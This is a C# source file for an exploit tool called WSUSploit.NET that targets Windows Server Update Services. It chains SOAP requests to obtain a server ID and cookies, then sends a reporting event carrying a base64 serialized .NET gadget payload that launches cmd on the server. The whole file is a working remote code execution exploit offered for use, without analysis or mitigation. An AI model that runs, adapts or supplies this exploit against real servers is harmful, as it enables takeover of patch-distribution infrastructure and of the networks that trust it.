using System;
using System.Text;
using System.Net.Http;
using System.Xml.Linq;
using System.Security;
using WSUSploit.NET;

if (args.Length == 0)
{
    Console.WriteLine("Usage: WSUSploit.NET <URL>");
    return;
}

Uri serverUri = new Uri(args[0]);

Console.WriteLine($"[*] Running against {serverUri}");

WSUSServer server = new WSUSServer(serverUri);
await server.GetServerId();
await server.GetAuthCookie();
await server.GetReportingCookie();
await server.SendMaliciousEvent();



namespace WSUSploit.NET
{
    class WSUSServer
    {
        public string ServerId { get; set; } = "";
        public int Port { get; set; }
        public Uri URL { get; set; }
        public string AuthCookie { get; set; } = "";
        public record ReportingCookie(string EncryptedData, string Expiration);
        public ReportingCookie reportingCookie { get; set; }

        private readonly HttpClient _httpClient;

        public WSUSServer(Uri url)
        {
            if (url.Port != 8530 && url.Port != 8531)
            {
                Console.WriteLine("[!] WARNING: Not specifying standard WSUS port 8530/8531");
            }

            _httpClient = new HttpClient();
            _httpClient.BaseAddress = url;
            _httpClient.Timeout = TimeSpan.FromSeconds(30);

            URL = url;
        }

        public async Task GetServerId()
        {
            Console.WriteLine("[*] Fetching Server ID...");

            string soapBody = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetRollupConfiguration xmlns=""http://www.microsoft.com/SoftwareDistribution"">
            <cookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            </GetRollupConfiguration>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration");

            var response = await _httpClient.PostAsync("/ReportingWebService/ReportingWebService.asmx", content);

            response.EnsureSuccessStatusCode();

            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespaces
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution";

            // Extract ServerId
            string? serverId = xmlDoc
                .Descendants(msNs + "ServerId")
                .FirstOrDefault()?.Value;

            if (serverId == null)
            {
                Console.WriteLine("[!] ERROR: Server ID is null! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] ServerId: {serverId}");

            this.ServerId = serverId;
        }

        public async Task GetAuthCookie()
        {
            Console.WriteLine("[*] Fetching AuthCookie...");

            string soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetAuthorizationCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService"">
            <clientId>{this.ServerId}</clientId>
            <targetGroupName></targetGroupName>
            <dnsName>hawktrace.local</dnsName>
            </GetAuthorizationCookie>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie");

            var response = await _httpClient.PostAsync("/SimpleAuthWebService/SimpleAuth.asmx", content);
            response.EnsureSuccessStatusCode();
            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespace
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService";

            // Extract CookieData
            string? cookieData = xmlDoc
                .Descendants(msNs + "CookieData")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(cookieData))
            {
                Console.WriteLine("[!] ERROR: CookieData not found! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] CookieData: {cookieData}");

            this.AuthCookie = cookieData;
        }

        public async Task GetReportingCookie()
        {
            Console.WriteLine("[*] Fetching ReportingCookie...");

            string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss'Z'");
            var soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"">
            <authCookies>
            <AuthorizationCookie>
            <PlugInId>SimpleTargeting</PlugInId>
            <CookieData>{this.AuthCookie}</CookieData>
            </AuthorizationCookie>
            </authCookies>
            <oldCookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            <lastChange>{timeNow}</lastChange>
            <currentTime>{timeNow}</currentTime>
            <protocolVersion>1.20</protocolVersion>
            </GetCookie>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie");

            var response = await _httpClient.PostAsync("/ClientWebService/Client.asmx", content);
            response.EnsureSuccessStatusCode();

            var responseBody = await response.Content.ReadAsStringAsync();

            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService";

            string? encryptedData = xmlDoc
                .Descendants(msNs + "EncryptedData")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(encryptedData))
            {
                Console.WriteLine("[!] ERROR: EncryptedData not found! Exiting...");
                Environment.Exit(1);
            }

            string? expiration = xmlDoc
                .Descendants(msNs + "Expiration")
                .FirstOrDefault()?.Value;

            if (string.IsNullOrEmpty(expiration))
            {
                Console.WriteLine("[!] ERROR: Expiration not found! Exiting...");
                Environment.Exit(1);
            }

            Console.WriteLine($"[*] GetCookieResult EncryptedData retrieved : (length: {encryptedData.Length})");
            Console.WriteLine($"[*] GetCookieResult Expiration retrieved : {expiration}");

            this.reportingCookie = new ReportingCookie(encryptedData, expiration);

        }

        public async Task SendMaliciousEvent()
        {
            Console.WriteLine("[*] Sending malicious event...");

            string targetSid = Guid.NewGuid().ToString();
            string eventInstanceId = Guid.NewGuid().ToString();
            string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fff");
            string b64Payload = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==";
            string payloadEnvelope = $@"<SOAP-ENV:Envelope
	            xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	            xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
	            xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/""
	            xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/""
	            xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
	            <SOAP-ENV:Body>
		            <a1:DataSet id=""ref-1""
			            xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"">
			            <DataSet.RemotingFormat xsi:type=""a1:SerializationFormat""
				            xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"">Binary
			            </DataSet.RemotingFormat>
			            <DataSet.DataSetName id=""ref-3""></DataSet.DataSetName>
			            <DataSet.Namespace href=""#ref-3""/>
			            <DataSet.Prefix href=""#ref-3""/>
			            <DataSet.CaseSensitive>false</DataSet.CaseSensitive>
			            <DataSet.LocaleLCID>1033</DataSet.LocaleLCID>
			            <DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>
			            <DataSet.ExtendedProperties xsi:type=""xsd:anyType"" xsi:null=""1""/>
			            <DataSet.Tables.Count>1</DataSet.Tables.Count>
			            <DataSet.Tables_0 href=""#ref-4""/>
		            </a1:DataSet>
		            <SOAP-ENC:Array id=""ref-4"" xsi:type=""SOAP-ENC:base64"">{b64Payload}</SOAP-ENC:Array>
	            </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>";

            string soapBody = $@"<soap:Envelope
	            xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/""
	            xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	            xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
	            xmlns:soapenc=""http://schemas.xmlsoap.org/soap/encoding/"">
	            <soap:Body>
		            <ReportEventBatch
			            xmlns=""http://www.microsoft.com/SoftwareDistribution"">
			            <cookie>
				            <Expiration>{this.reportingCookie.Expiration}</Expiration>
				            <EncryptedData>{this.reportingCookie.EncryptedData}</EncryptedData>
			            </cookie>
			            <clientTime>{timeNow}</clientTime>
			            <eventBatch
				            xmlns:q1=""http://www.microsoft.com/SoftwareDistribution"" soapenc:arrayType=""q1:ReportingEvent[1]"">
				            <ReportingEvent>
					            <BasicData>
						            <TargetID>
							            <Sid>{targetSid}</Sid>
						            </TargetID>
						            <SequenceNumber>0</SequenceNumber>
						            <TimeAtTarget>{timeNow}</TimeAtTarget>
						            <EventInstanceID>{eventInstanceId}</EventInstanceID>
						            <NamespaceID>2</NamespaceID>
						            <EventID>389</EventID>
						            <SourceID>301</SourceID>
						            <UpdateID>
							            <UpdateID>00000000-0000-0000-0000-000000000000</UpdateID>
							            <RevisionNumber>0</RevisionNumber>
						            </UpdateID>
						            <Win32HResult>0</Win32HResult>
						            <AppName>LocalServer</AppName>
					            </BasicData>
					            <ExtendedData>
						            <MiscData soapenc:arrayType=""xsd:string[2]"">
							            <string>Administrator=SYSTEM</string>
							            <string>SynchronizationUpdateErrorsKey={SecurityElement.Escape(payloadEnvelope)}</string>
						            </MiscData>
					            </ExtendedData>
					            <PrivateData>
						            <ComputerDnsName></ComputerDnsName>
						            <UserAccountName></UserAccountName>
					            </PrivateData>
				            </ReportingEvent>
			            </eventBatch>
		            </ReportEventBatch>
	            </soap:Body>
            </soap:Envelope>";

            var request = new HttpRequestMessage(HttpMethod.Post, "/ReportingWebService/ReportingWebService.asmx");
            
            request.Headers.Add("Connection", "Keep-Alive");
            request.Headers.Add("Accept", "text/xml");
            request.Headers.Add("User-Agent", "Windows-Update-Agent");
            request.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/ReportEventBatch");
            request.Content = new StringContent(soapBody, Encoding.UTF8, "text/xml");

            var response = await _httpClient.SendAsync(request);
            var responseBody = await response.Content.ReadAsStringAsync();
            response.EnsureSuccessStatusCode();
        }

    }
}